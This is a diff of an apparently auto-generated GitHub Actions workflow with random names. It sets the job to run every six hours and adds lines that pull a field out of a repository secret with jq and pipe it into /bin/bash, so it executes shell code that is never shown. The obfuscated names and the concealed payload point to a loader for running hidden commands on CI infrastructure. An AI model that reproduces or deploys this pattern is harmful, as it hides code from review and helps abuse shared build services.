@@ -1,8 +1,9 @@
 name: jixuanyuan4756
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 4/6 * * *'
+    - cron: '57 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: jixuanyuan4756
         env:
-          mq54469: ${{ secrets.mq54469 }}
+          h493: ${{ secrets.h493 }}
         run: |
-          echo $mq54469 | jq -r .ocn5 | /bin/bash
-          echo $w251 | jq -r .hvl110 | /bin/bash
-          echo $vpqms2586 | jq -r .hxwe4 | /bin/bash
-          echo $uyvq6 | jq -r .pzk838 | /bin/bash
-          echo $n3 | jq -r .uzz18596 | /bin/bash
-          echo $wyi26 | jq -r .qfb22 | /bin/bash
-          echo $j97 | jq -r .wta66127 | /bin/bash
-          echo $sgfx4 | jq -r .fwkt80519 | /bin/bash
-          echo $kd61614 | jq -r .fmrk00267 | /bin/bash
-          echo $hqgz210 | jq -r .yuax3 | /bin/bash
+          echo $h493 | jq -r .z06881 | /bin/bash
+          echo $jdle0739 | jq -r .y519 | /bin/bash
+          echo $unoyl07118 | jq -r .j87 | /bin/bash
+          echo $jh0 | jq -r .t4 | /bin/bash
+          echo $nxai7 | jq -r .yyod27791 | /bin/bash
+          echo $nh104 | jq -r .w7 | /bin/bash
+          echo $z9 | jq -r .tb1 | /bin/bash
+          echo $w185 | jq -r .haztc88832 | /bin/bash
+          echo $qo4 | jq -r .pdl32 | /bin/bash
 
